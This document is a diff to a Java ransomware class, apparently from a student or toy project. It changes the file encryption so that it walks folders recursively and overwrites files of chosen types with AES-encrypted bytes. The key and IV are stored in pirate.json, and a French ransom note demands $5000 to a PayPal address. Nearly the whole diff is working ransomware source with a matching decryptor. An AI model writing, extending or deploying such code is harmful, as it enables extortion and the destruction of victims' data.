@@ -14,7 +14,7 @@ import java.util.stream.Collectors;
 
 public class AESService {
 
-    private static final String ENCRYPTED_FILES_FILENAME = "pirate.txt";
+    private static final String FILE_TYPES_FILENAME = "pirate.txt";
     private static final String ENCRYPTION_PARAMS_FILENAME = "pirate.json";
 
     public static void execute(Args args) {
@@ -38,39 +38,45 @@ public class AESService {
                 directory,
                 fileTypes.stream().map(FileType::toString).collect(Collectors.joining(", "))));
 
-        // Get files in directory
-        List<File> files = FileUtils.getFiles(directory, fileTypes);
-        List<String> filePaths = FileUtils.getRelativePaths(directory, files);
-
-        Logger.logDebug(String.format(
-                "Files : %s",
-                files.stream().map(File::getPath).collect(Collectors.joining(", "))));
-
-        // Convert files to bytes
-        List<byte[]> filesAsBytes = FileUtils.toBytes(files);
-
         SecretKey key = EncryptionParamsUtils.generateKey();
         Logger.logDebug(String.format("Key : %s", Base64.getEncoder().encodeToString(key.getEncoded())));
         IvParameterSpec iv = EncryptionParamsUtils.generateIv();
         Logger.logDebug(String.format("IV : %s", Base64.getEncoder().encodeToString(iv.getIV())));
 
-        // Encrypt file bytes
-        List<byte[]> encryptedFilesAsBytes = CipherUtils.encrypt(filesAsBytes, key, iv);
-        List<String> encryptedFilesAsStrings = ByteUtils.toStrings(encryptedFilesAsBytes);
+        // Encrypt files
+        encryptFiles(directory, fileTypes, key, iv);;
 
         // Save filenames and contents to pirate.txt
-        FileUtils.saveFilesAsStrings(directory, ENCRYPTED_FILES_FILENAME, encryptedFilesAsStrings);
-        Logger.logDebug(String.format("Save encrypted files to %s", ENCRYPTED_FILES_FILENAME));
+        TextFileUtils.saveFileTypes(directory, FILE_TYPES_FILENAME, fileTypes);
+        Logger.logDebug(String.format("Save encrypted files to %s", FILE_TYPES_FILENAME));
 
         // Save key and iv to pirate.json
-        JsonUtils.saveEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME, key, iv, filePaths);
+        JsonFileUtils.saveEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME, key, iv);
         Logger.logDebug(String.format("Save key and iv to %s", ENCRYPTION_PARAMS_FILENAME));
-
-        // Delete files
-        FileUtils.deleteFiles(directory, files);
 
         // Display ransom message
         Logger.logInfo("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données.");
+    }
+
+    // TODO : Add javadocs
+    private static void encryptFiles(File directory, List<FileType> fileTypes, SecretKey key, IvParameterSpec iv) {
+        // Get files matching file types to encrypt
+        List<File> filesToEncrypt = FileUtils.getFiles(directory, fileTypes);
+
+        // Encrypt each file
+        for (File file : filesToEncrypt) {
+            byte[] bytes = FileUtils.toBytes(file);
+            byte[] encryptedBytes = CipherUtils.encrypt(bytes, key, iv);
+            FileUtils.overwriteFile(file, encryptedBytes);
+        }
+
+        // Get subdirectory in directory
+        List<File> subdirectories = FileUtils.getSubdirectories(directory);
+
+        // Recursively encrypt each subdirectory
+        for (File subdirectory : subdirectories) {
+            encryptFiles(subdirectory, fileTypes, key, iv);
+        }
     }
 
     /**
@@ -80,27 +86,46 @@ public class AESService {
         Logger.logDebug(String.format("Decrypting with directory %s", directory));
 
         // Get encrypted files from pirate.txt
-        List<String> filesAsStrings = FileUtils.getFilesAsStrings(directory, ENCRYPTED_FILES_FILENAME);
-        Logger.logDebug(String.format("Read encrypted files from %s", ENCRYPTED_FILES_FILENAME));
+        List<FileType> fileTypes = TextFileUtils.getFileTypes(directory, FILE_TYPES_FILENAME);
+        Logger.logDebug(String.format("Read encrypted files from %s", FILE_TYPES_FILENAME));
 
         // Get encryption params (key and iv) from pirate.json
-        EncryptionParams encryptionParams = JsonUtils.getEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME);
+        EncryptionParams encryptionParams = JsonFileUtils.getEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME);
         Logger.logDebug(String.format("Read key and iv to %s", ENCRYPTION_PARAMS_FILENAME));
 
         // Convert encryption params to their original forms
         SecretKey key = EncryptionParamsUtils.toSecretKey(encryptionParams.key);
         IvParameterSpec iv = EncryptionParamsUtils.toIvParameterSpec(encryptionParams.iv);
 
-        // Convert files as strings to files as bytes
-        List<byte[]> filesAsBytes = ByteUtils.toBytes(filesAsStrings);
+        // Decrypt files
+        decryptFiles(directory, fileTypes, key, iv);
 
-        // Decrypt files as strings
-        List<byte[]> decryptedFilesAsBytes = CipherUtils.decrypt(filesAsBytes, key, iv);
-
-        // Save files to given directory
-        FileUtils.saveFilesAsBytes(directory, encryptionParams.filePaths, decryptedFilesAsBytes);
+        // Delete encryption params and file types files
+        FileUtils.deleteFile(directory, ENCRYPTION_PARAMS_FILENAME);
+        FileUtils.deleteFile(directory, FILE_TYPES_FILENAME);
 
         // Display decryption message
         Logger.logInfo(String.format("Les fichiers ont été déchiffrés dans le répertoire %s", directory));
+    }
+
+    // TODO : Add javadocs
+    private static void decryptFiles(File directory, List<FileType> fileTypes, SecretKey key, IvParameterSpec iv) {
+        // Get files matching file types to decrypt
+        List<File> filesToDecrypt = FileUtils.getFiles(directory, fileTypes);
+
+        // Decrypt each file
+        for (File file : filesToDecrypt) {
+            byte[] bytes = FileUtils.toBytes(file);
+            byte[] originalBytes = CipherUtils.decrypt(bytes, key, iv);
+            FileUtils.overwriteFile(file, originalBytes);
+        }
+
+        // Get subdirectory in directory
+        List<File> subdirectories = FileUtils.getSubdirectories(directory);
+
+        // Recursively decrypt each subdirectory
+        for (File subdirectory : subdirectories) {
+            decryptFiles(subdirectory, fileTypes, key, iv);
+        }
     }
 }
